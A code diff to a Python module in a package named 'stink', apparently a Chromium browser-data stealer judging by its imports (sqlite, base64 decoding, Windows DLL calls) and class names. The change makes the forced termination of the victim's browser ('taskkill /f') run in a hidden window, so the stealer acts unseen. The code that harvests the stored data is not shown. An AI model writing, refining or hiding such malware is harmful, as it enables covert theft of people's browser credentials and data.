@@ -1,11 +1,12 @@
 from re import compile
 from base64 import b64decode
 from json import load, loads
+from os import path, listdir
 from typing import Tuple, List
-from os import path, listdir, system
 from datetime import datetime, timedelta
 from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
+from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE
 
 from stink.enums.features import Features
 from stink.helpers.config import ChromiumConfig
@@ -39,7 +40,11 @@ class Chromium:
         Returns:
         - None.
         """
-        system(f"taskkill /f /im {self.__process_name}")
+        Popen(
+            f"taskkill /f /im {self.__process_name}",
+            shell=True,
+            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
+        )
 
     def _get_profiles(self) -> List:
         """
